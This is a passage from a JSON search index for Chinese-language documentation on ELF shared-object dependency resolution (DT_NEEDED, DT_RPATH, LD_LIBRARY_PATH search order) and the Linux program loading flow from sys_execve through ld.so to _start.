uff0c\u4ee5\u4fbf\u4e8e\u6267\u884c\u3002\u56e0\u6b64\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u4e13\u95e8\u63cf\u8ff0\u4ed6\u4eec\u7684\u4f9d\u8d56\u5173\u7cfb\u3002  \u5f53\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u5728DT_NEEDED\u9879\u4e2d\u63cf\u8ff0\u7684\u4f9d\u8d56\u7ed9\u51fa\u4e86\u9700\u8981\u4ec0\u4e48\u4f9d\u8d56\u6587\u4ef6\u6765\u652f\u6301\u7a0b\u5e8f\u7684\u670d\u52a1\u3002\u901a\u8fc7\u4e0d\u65ad\u5730\u8fde\u63a5\u88ab\u5f15\u7528\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u5373\u4f7f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88ab\u5f15\u7528\u591a\u6b21\uff0c\u5b83\u6700\u540e\u4e5f\u53ea\u4f1a\u88ab\u52a8\u6001\u94fe\u63a5\u5668\u8fde\u63a5\u4e00\u6b21\uff09\u53ca\u5b83\u4eec\u7684\u4f9d\u8d56\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5efa\u7acb\u4e86\u4e00\u4e2a\u5b8c\u5168\u7684\u8fdb\u7a0b\u955c\u50cf\u3002\u5f53\u89e3\u6790\u7b26\u53f7\u5f15\u7528\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u4f7f\u7528BFS\uff08\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u6765\u68c0\u67e5\u7b26\u53f7\u8868\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9996\u5148\uff0c\u5b83\u4f1a\u68c0\u67e5\u53ef\u6267\u884c\u6587\u4ef6\u672c\u8eab\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u6309\u7167\u987a\u5e8f\u68c0\u67e5DT_NEEDED\u5165\u53e3\u4e2d\u7684\u7b26\u53f7\u8868\uff0c\u7136\u540e\u624d\u4f1a\u7ee7\u7eed\u67e5\u770b\u4e0b\u4e00\u6b21\u4f9d\u8d56\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u53ef\u4ee5\u88ab\u7a0b\u5e8f\u8bfb\u53d6\uff0c\u5176\u5b83\u6743\u9650\u4e0d\u4e00\u5b9a\u9700\u8981\u3002  \u4f9d\u8d56\u5217\u8868\u4e2d\u7684\u540d\u5b57\u8981\u4e48\u662fDT_SONAME\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u8981\u4e48\u662f\u7528\u4e8e\u6784\u5efa\u5bf9\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\u540d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u94fe\u63a5\u5668\u4f7f\u7528\u4e86\u4e00\u4e2a\u5e26\u6709DT_SONAME\u9879\u540d\u5b57\u53eb\u505alib1\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u4e00\u4e2a\u5176\u4ed6\u8def\u5f84\u540d\u4e3a/usr/lib/lib2\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u90a3\u4e48\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5c06\u4f1a\u5305\u542blib1\u4ee5\u53ca/usr/lib/lib2\u4f9d\u8d56\u5217\u8868\u3002  \u5982\u679c\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5177\u6709\u4e00\u4e2a\u6216\u8005\u591a\u4e2a/\uff0c\u4f8b\u5982/usr/lib/lib2\u6216\u8005directory/file\uff0c\u90a3\u4e48\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u76f4\u63a5\u4f7f\u7528\u90a3\u4e2a\u5b57\u7b26\u4e32\u6765\u4f5c\u4e3a\u8def\u5f84\u7684\u540d\u5b57\u3002\u5982\u679c\u540d\u5b57\u4e2d\u6ca1\u6709/\uff0c\u6bd4\u5982lib1\uff0c\u90a3\u4e48\u4ee5\u4e0b\u7684\u4e09\u79cd\u673a\u5236\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u641c\u7d22\u7684\u987a\u5e8f\u3002    \u9996\u5148\uff0c\u52a8\u6001\u6570\u7ec4\u6807\u8bb0DT_RPATH\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u5305\u542b\u4e00\u7cfb\u5217\u4ee5:\u5206\u5272\u7684\u76ee\u5f55\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 /home/dir/lib:/home/dir2/lib: \u544a\u8bc9\u6211\u4eec\u5148\u5728 /home/dir/lib \u76ee\u5f55\u641c\u7d22\uff0c\u7136\u540e\u518d\u5728 /home/dir2/lib \u641c\u7d22\uff0c\u6700\u540e\u5728\u5f53\u524d\u76ee\u5f55\u641c\u7d22\u3002    \u5176\u6b21\uff0c\u8fdb\u7a0b\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u540d\u53ebLD_LIBRARY_PATH\u7684\u53d8\u91cf\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u4e0a\u8ff0\u6240\u8bf4\u683c\u5f0f\u7684\u76ee\u5f55\uff0c\u6700\u540e\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a;\uff0c\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u540e\u9762\u8ddf\u7740\u53e6\u5916\u4e00\u4e2a\u76ee\u5f55\u5217\u8868\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6548\u679c\u4e0e\u7b2c\u4e00\u4e2a\u6240\u8bf4\u7684\u6548\u679c\u76f8\u540c    LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:   LD_LIBRARY_PATH=/home/dir/lib;/home/dir2/lib:  LD_LIBRARY_PATH=/home/dir/lib:/home/dir2/lib:;   \u6240\u6709\u7684LD_LIBRARY_PATH\u4e2d\u7684\u76ee\u5f55\u53ea\u4f1a\u5728\u641c\u7d22\u5b8cDT_RPATH\u624d\u4f1a\u8fdb\u884c\u641c\u7d22\u3002\u5c3d\u7ba1\u6709\u4e00\u4e9b\u7a0b\u5e8f\uff08\u5982\u94fe\u63a5\u7f16\u8f91\u5668\uff09\u5728\u5904\u7406;\u524d\u540e\u7684\u5217\u8868\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u7684\u65b9\u5f0f\u5b8c\u5168\u4e00\u6837\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u53d7\u5206\u53f7\u8868\u793a\u8bed\u6cd5\uff0c\u6b63\u5982\u4e0a\u9762\u6240\u63cf\u8ff0\u7684\u6837\u5b50\u3002   \u6700\u540e\uff0c\u5982\u679c\u4ee5\u4e0a\u4e24\u7ec4\u76ee\u5f55\u65e0\u6cd5\u5b9a\u4f4d\u671f\u671b\u7684\u5e93\uff0c\u5219\u52a8\u6001\u94fe\u63a5\u5668\u641c\u7d22 /usr/lib  \u8def\u5f84\u4e0b\u7684\u5e93\u3002   \u6ce8\u610f   \u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u5bf9\u4e8e set-user  \u4ee5\u53ca  set-group  \u6807\u8bc6\u7684\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5ffd\u7565\u641c\u7d22\u73af\u5883\u53d8\u91cf\uff08\u4f8b\u5982 LD_LIBRARY_PATH \uff09\uff0c\u4ec5\u4ec5\u641c\u7d22 DT_RPATH \u6307\u5b9a\u7684\u76ee\u5f55\u548c /usr/lib \u3002", 
            "title": "Shared Object Dependencies"
        }, 
        {
            "location": "/executable/elf/running_overview/", 
            "text": "\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\n\n\n\u53c2\u8003 Execution Angleboye@Bamboofox \u3002\n\n\n\u57fa\u672c\u6982\u8ff0\n\n\n\u9759\u6001\u6267\u884c\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u9759\u6001\u6267\u884c\u7684\u57fa\u672c\u8fc7\u7a0b\u3002\n\n\n\n\n\u52a8\u6001\u6267\u884c\n\n\n\n\n\u57fa\u672c\u64cd\u4f5c\u8bf4\u660e\n\n\nsys_execve\n\n\n\u8be5\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u6267\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5373\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u4f1a\u68c0\u67e5\u76f8\u5e94\u7684argv\u4ee5\u53caenvp\u7b49\u53c2\u6570\u3002\n\n\ndo_execve\n\n\n\u8be5\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6620\u50cf\u6587\u4ef6\uff0c\u5e76\u4ece\u76ee\u6807\u6587\u4ef6\u7684\u5f00\u59cb\u5904\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\uff08\u76ee\u524d\u4e3a128\uff09\u5b57\u8282\u6765\u83b7\u53d6\u76f8\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u3002\n\n\nsearch_binary_handler\n\n\n\u8be5\u51fd\u6570\u4f1a\u641c\u7d22\u652f\u6301\u5904\u7406\u5f53\u524d\u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7c7b\u578b\u961f\u5217\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u5404\u79cd\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u5904\u7406\u7a0b\u5e8f\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002\n\n\nload_elf_binary\n\n\n\u8be5\u51fd\u6570\u7684\u4e3b\u8981\u5904\u7406\u6d41\u7a0b\u5982\u4e0b\n\n\n\n\n\n\n\u68c0\u67e5\u5e76\u83b7\u53d6elf\u6587\u4ef6\u7684\u5934\u90e8\u4fe1\u606f\u3002\n\n\n\n\n\n\n\u5982\u679c\u76ee\u6807\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u5219\u4f7f\u7528.interp \u8282\u6765\u786e\u5b9aloader\u7684\u8def\u5f84\u3002\n\n\n\n\n\n\n\u5c06program header \u4e2d\u8bb0\u5f55\u7684\u76f8\u5e94\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002program header\u4e2d\u6709\u4ee5\u4e0b\u91cd\u8981\u4fe1\u606f\n\n\n\n\n\n\n\u6bcf\u4e00\u4e2a\u6bb5\u9700\u8981\u6620\u5c04\u5230\u7684\u5730\u5740\n\n\n\n\n\u6bcf\u4e00\u4e2a\u6bb5\u76f8\u5e94\u7684\u6743\u9650\u3002\n\n\n\u8bb0\u5f55\u54ea\u4e9b\u8282\u5c5e\u4e8e\u54ea\u4e9b\u6bb5\u3002\n\n\n\n\n\u5177\u4f53\u7684\u6620\u5c04\u5982\u4e0b\n\n\n\n\n\u5206\u60c5\u51b5\u5904\u7406\n\n\n\n\n\u52a8\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3aloader(ld.so)\u7684entry point\u3002\n\n\n\u9759\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n\n\n\n\nld.so\n\n\n\u8be5\u6587\u4ef6\u6709\u4ee5\u4e0b\u529f\u80fd\n\n\n\n\n\u4e3b\u8981\u7528\u4e8e\u8f7d\u5165ELF\u6587\u4ef6\u4e2dDT_NEED\u4e2d\u8bb0\u5f55\u7684\u5171\u4eab\u5e93\u3002\n\n\n\u521d\u59cb\u5316\u5de5\u4f5c\n\n\n\u521d\u59cb\u5316GOT\u8868\u3002\n\n\n\u5c06symbol table\u5408\u5e76\u5230global symbol table\u3002\n\n\n\n\n_start\n\n\n_start\u51fd\u6570\u4f1a\u5c06\u4ee5\u4e0b\u9879\u76ee\u4ea4\u7ed9libc_start_main\n\n\n\n\n\u73af\u5883\u53d8\u91cf\u8d77\u59cb\u5730\u5740\n\n\n.init\n\n\n\u542f\u52a8main\u51fd\u6570\u524d\u7684\u521d\u59cb\u5316\u5de5\u4f5c\n\n\nfini\n\n\n\u7a0b\u5e8f\u7ed3\u675f\u524d\u7684\u6536\u5c3e\u5de5\u4f5c\u3002", 
            "title": "\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b"
        }, 
        {
            "location": "/executable/elf/running_overview/#_1", 
            "text": "\u53c2\u8003 Execution Angleboye@Bamboofox \u3002", 
            "title": "\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b"
        }, 
        {
            "location": "/executable/elf/running_overview/#_2", 
            "text": "", 
            "title": "\u57fa\u672c\u6982\u8ff0"
        }, 
        {
            "location": "/executable/elf/running_overview/#_3", 
            "text": "\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u9759\u6001\u6267\u884c\u7684\u57fa\u672c\u8fc7\u7a0b\u3002", 
            "title": "\u9759\u6001\u6267\u884c"
        }, 
        {
            "location": "/executable/elf/running_overview/#_4", 
            "text": "", 
            "title": "\u52a8\u6001\u6267\u884c"
        }, 
        {
            "location": "/executable/elf/running_overview/#_5", 
            "text": "", 
            "title": "\u57fa\u672c\u64cd\u4f5c\u8bf4\u660e"
        }, 
        {
            "location": "/executable/elf/running_overview/#sys_execve", 
            "text": "\u8be5\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u6267\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5373\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u4f1a\u68c0\u67e5\u76f8\u5e94\u7684argv\u4ee5\u53caenvp\u7b49\u53c2\u6570\u3002", 
            "title": "sys_execve"
        }, 
        {
            "location": "/executable/elf/running_overview/#do_execve", 
            "text": "\u8be5\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6620\u50cf\u6587\u4ef6\uff0c\u5e76\u4ece\u76ee\u6807\u6587\u4ef6\u7684\u5f00\u59cb\u5904\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\uff08\u76ee\u524d\u4e3a128\uff09\u5b57\u8282\u6765\u83b7\u53d6\u76f8\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u3002", 
            "title": "do_execve"
        }, 
        {
            "location": "/executable/elf/running_overview/#search_binary_handler", 
            "text": "\u8be5\u51fd\u6570\u4f1a\u641c\u7d22\u652f\u6301\u5904\u7406\u5f53\u524d\u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7c7b\u578b\u961f\u5217\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u5404\u79cd\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u5904\u7406\u7a0b\u5e8f\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002", 
            "title": "search_binary_handler"
        }, 
        {
            "location": "/executable/elf/running_overview/#load_elf_binary", 
            "text": "\u8be5\u51fd\u6570\u7684\u4e3b\u8981\u5904\u7406\u6d41\u7a0b\u5982\u4e0b    \u68c0\u67e5\u5e76\u83b7\u53d6elf\u6587\u4ef6\u7684\u5934\u90e8\u4fe1\u606f\u3002    \u5982\u679c\u76ee\u6807\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u5219\u4f7f\u7528.interp \u8282\u6765\u786e\u5b9aloader\u7684\u8def\u5f84\u3002    \u5c06program header \u4e2d\u8bb0\u5f55\u7684\u76f8\u5e94\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002program header\u4e2d\u6709\u4ee5\u4e0b\u91cd\u8981\u4fe1\u606f    \u6bcf\u4e00\u4e2a\u6bb5\u9700\u8981\u6620\u5c04\u5230\u7684\u5730\u5740   \u6bcf\u4e00\u4e2a\u6bb5\u76f8\u5e94\u7684\u6743\u9650\u3002  \u8bb0\u5f55\u54ea\u4e9b\u8282\u5c5e\u4e8e\u54ea\u4e9b\u6bb5\u3002   \u5177\u4f53\u7684\u6620\u5c04\u5982\u4e0b   \u5206\u60c5\u51b5\u5904\u7406   \u52a8\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3aloader(ld.so)\u7684entry point\u3002  \u9759\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002", 
            "title": "load_elf_binary"
        }, 
        {
            "location": "/executable/elf/running_overview/#ldso", 
            "text": "\u8be5\u6587\u4ef6\u6709\u4ee5\u4e0b\u529f\u80fd   \u4e3b\u8981\u7528\u4e8e\u8f7d\u5165ELF\u6587\u4ef6\u4e2dDT_NEED\u4e2d\u8bb0\u5f55\u7684\u5171\u4eab\u5e93\u3002  \u521d\u59cb\u5316\u5de5\u4f5c  \u521d\u59cb\u5316GOT\u8868\u3002  \u5c06symbol table\u5408\u5e76\u5230global symbol table\u3002", 
            "title": "ld.so"
        }, 
        {
            "location": "/executable/elf/running_overview/#_start", 
            "text": "_start\u51fd\u6570\u4f1a\u5c06\u4ee5\u4e0b\u9879\u76ee\u4ea4\u7ed9libc_start_main   \u73af\u5883\u53d8\u91cf\u8d77\u59cb\u5730\u5740  .init  \u542f\u52a8main\u51fd\u6570\u524d\u7684\u521d\u59cb\u5316\u5de5\u4f5c  fini  \u7a0b\u5e8f\u7ed3\u675f\u524d\u7684\u6536\u5c3e\u5de5\u4f5c\u3002", 
            "title": "_start"
        }
    ]
}